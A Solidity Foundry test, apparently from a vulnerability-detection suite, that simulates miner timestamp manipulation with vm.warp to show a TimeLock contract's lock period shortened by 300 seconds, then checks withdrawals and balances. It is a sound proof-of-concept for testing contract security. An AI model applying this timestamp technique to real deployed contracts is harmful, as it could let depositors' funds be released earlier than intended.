// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/timelock.sol";

contract TimeLockTest is Test {
    TimeLock timelock;
    address internal normalUser = makeAddr("normalUser");
    address internal manipulatedUser = makeAddr("manipulatedUser");
    uint256 public constant MANIPULATION_DELAY = 300; // 5 minutes (300 seconds)
    uint256 public constant WEEK = 1 weeks;

    function setUp() public {
        // Set safe initial timestamp (1000 seconds)
        vm.warp(1000);
        timelock = new TimeLock();
        // Fund both users
        vm.deal(normalUser, 1 ether);
        vm.deal(manipulatedUser, 1 ether);
    }

    function testTimestampManipulation() public {
        uint256 baseTime = block.timestamp;
        uint256 initialNormalBalance = normalUser.balance;
        uint256 initialManipulatedBalance = manipulatedUser.balance;
        bool vulnerabilityConfirmed = false;

        // --- BEFORE-Trigger: Normal deposit at correct time ---
        console2.log("--- BEFORE-Trigger (Normal Deposit) ---");
        vm.prank(normalUser);
        timelock.deposit{value: 1 ether}();
        uint256 normalLockTime = timelock.lockTime(normalUser);
        console2.log("Normal deposit block time:        ", block.timestamp);
        console2.log("Expected lock period:             ", WEEK);
        console2.log("Calculated unlock time:           ", block.timestamp + WEEK);
        console2.log("Actual lock time stored:          ", normalLockTime);
        
        // --- Trigger: Timestamp manipulation ---
        console2.log("--- Trigger: Timestamp Manipulation ---");
        uint256 manipulatedTime = baseTime - MANIPULATION_DELAY;
        vm.warp(manipulatedTime);
        console2.log("Manipulated block.timestamp:     ", block.timestamp);
        
        // --- AFTER-Trigger: Deposit after timestamp manipulation ---
        console2.log("--- AFTER-Trigger (Manipulated Deposit) ---");
        vm.prank(manipulatedUser);
        timelock.deposit{value: 1 ether}();
        uint256 manipulatedLockTime = timelock.lockTime(manipulatedUser);
        console2.log("Manipulated deposit block time:  ", block.timestamp);
        console2.log("Calculated unlock time:           ", block.timestamp + WEEK);
        console2.log("Actual lock time stored:          ", manipulatedLockTime);
        
        // --- Differential Validation ---
        console2.log("--- Differential Validation ---");
        console2.log("Lock time difference (normal - manipulated):", normalLockTime - manipulatedLockTime);
        console2.log("Expected difference:              ", MANIPULATION_DELAY);
        
        vulnerabilityConfirmed = (normalLockTime - manipulatedLockTime == MANIPULATION_DELAY);
        console2.log("Vulnerability State:              ", vulnerabilityConfirmed);
        
        // Withdraw from manipulated account (exploit verification)
        console2.log("--- Exploit Verification ---");
        
        // Attempt early withdrawal (should fail)
        vm.warp(manipulatedLockTime - 1);
        vm.prank(manipulatedUser);
        vm.expectRevert("Funds are still locked");
        timelock.withdraw();
        
        // Withdraw at correct time (should succeed)
        vm.warp(manipulatedLockTime + 1);
        vm.prank(manipulatedUser);
        timelock.withdraw();
        
        // Withdraw from normal account (proper functionality)
        console2.log("Verifying normal withdrawal...");
        vm.warp(normalLockTime + 1);
        vm.prank(normalUser);
        timelock.withdraw();
        
        // Final verifications
        assertEq(manipulatedUser.balance, initialManipulatedBalance, "Manipulated user funds not restored");
        assertEq(normalUser.balance, initialNormalBalance, "Normal user funds not restored");
        
        // Final vulnerability verdict
        if (vulnerabilityConfirmed) {
            console2.log("Vulnerability Exists: Timestamp manipulation reduced lock time by 300 seconds");
        } else {
            console2.log("Vulnerability not Exist: Lock time difference does not match manipulation delay");
        }
    }
}